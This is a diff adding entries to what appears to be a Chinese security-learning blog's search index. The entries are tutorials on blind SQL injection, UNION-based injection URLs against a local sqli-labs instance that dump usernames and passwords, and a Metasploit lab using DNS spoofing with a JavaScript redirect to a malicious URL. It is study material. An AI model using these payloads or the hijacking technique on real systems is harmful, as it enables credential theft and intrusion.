@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[盲注]]></title>
+    <url>%2F2019%2F04%2F11%2F%E7%9B%B2%E6%B3%A8%2F</url>
+    <content type="text"><![CDATA[前言第八关学习盲注 当id=100时，页面上没有任何提示出现 id=1&#39;等方法也无法显示报错信息 我们把这一类不显示错误信息的注入类型称为盲注 这种情况下只能猜了 有两种方法 其一为“基于布尔的注入” 其二为“基于时间的注入” 布尔实际上布尔的意思就是true或者false 我们尝试着报错，然后修复 ?id=1&#39; --+ ?id=1&#39; and 1=1 --+ 如果没问题，页面上也只显示“You are in…” 我们无法直接获取数据库名、版本等信息 只能旁交侧击，从信息长度，首字母是什么等一步一步慢慢推敲 原理 猜测长度1SELECT length(database()) 然后通过比大小的方法得到数据库的长度 然后开始猜每一个位置的字母 猜测字母1SELECT SUBSTR(database(),1,1) substr()用来获得一个字符串中的一个片段，他需要三个参数，第一个是字符串，第二个是开始的位置，第三个是获取的长度。 得到security的首字母是s 字母对应的ascii码1SELECT ascii(SUBSTR(database(),1,1)) 115对应的就是小写字母s ascii表 判断true或者false1SELECT ascii(SUBSTR(database(),1,1))=115 1代表真 假设我们现在不知道真正的值是115 我们猜测值小于110 1SELECT ascii(SUBSTR(database(),1,1))&lt;110 结果是0，说明首字母的ascii值大于或等于110 这就是猜测的过程，通过数字比大小，比一个字母一个字母的猜效率要高一点 把database()换成version()就可以猜版本了 小结基于布尔的盲注就说明到这里，原理并不难 如果觉得手工猜费劲，猜测的过程也可以交给工具来完成。]]></content>
+      <categories>
+        <category>从0开始学注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>盲注</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[msf攻击]]></title>
+    <url>%2F2019%2F04%2F08%2Fmsf%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[前言使用msf攻击目标服务器 环境复现1234| 角色 | 系统版本 | IP |备注 || ------ | ------ | ------ | ------ || 靶机| Windows service 2008R2（64bit）| 192.168.59.134 | || 攻击机 | Kali Linux 64 Bit 2019.1a | 192.168.59.138 | Metasploit版本为5.0.2 | 步骤启动数据库查看数据库状态，并启动数据库 12/etc/init.d/postgresql status/etc/init.d/postgresql start 打开msf1msfconsole 在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点(URL), 在apache中写上自动跳转的代码，向恶意URL上跳转 javascript： 1234&lt;script language="javascript" type="text/javascript"&gt; // 以下方式定时跳转setTimeout("javascript:location.href='hello.html'", 5000); &lt;/script&gt;]]></content>
+      <categories>
+        <category>msf</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[sql注入常用代码]]></title>
     <url>%2F2019%2F04%2F06%2Fsql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%2F</url>
     <content type="text"><![CDATA[前言为了更顺利的进行之后的学习 我们需要先掌握一些SQL的基础知识 不管用什么方法，先连接到数据库 我这里使用Navicat，连接好之后在查询功能中做练习 循序渐进SHOW DATABASES USE security; SHOW TABLES; DESC users; 用来观察表的字段 USE information_schema; 切换到数据表information_schema 使用show tables; 可以看到这里有好多数据表 可以尽情地练习sql语法 DESC TABLES SELECT table_name FROM information_schema.TABLES WHERE table_schema=”security”; 把table_name换成group_concat(table_name)，便可以把所有的表名放在一行显示 在练习一中试一下 可以看到全部四个表名，接下来介绍查看每个表中每个字段的名字的方法。 DESC COLUMNS SELECT column_name FROM information_schema.columns WHERE table_name=’users’; 回到第一题中试一下 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns WHERE table_name=”users” –+ 同理可以查看剩余三个表的字段名 这个自己练，我就不写了 知道字段名后，便可以查看该字段下的所有值了 我们来试着查看users表中字段username下的所有值 http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(username),3 from users –+ 同理，可以查看用户的密码http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users –+ 至此，最最基础的部分就完结了]]></content>
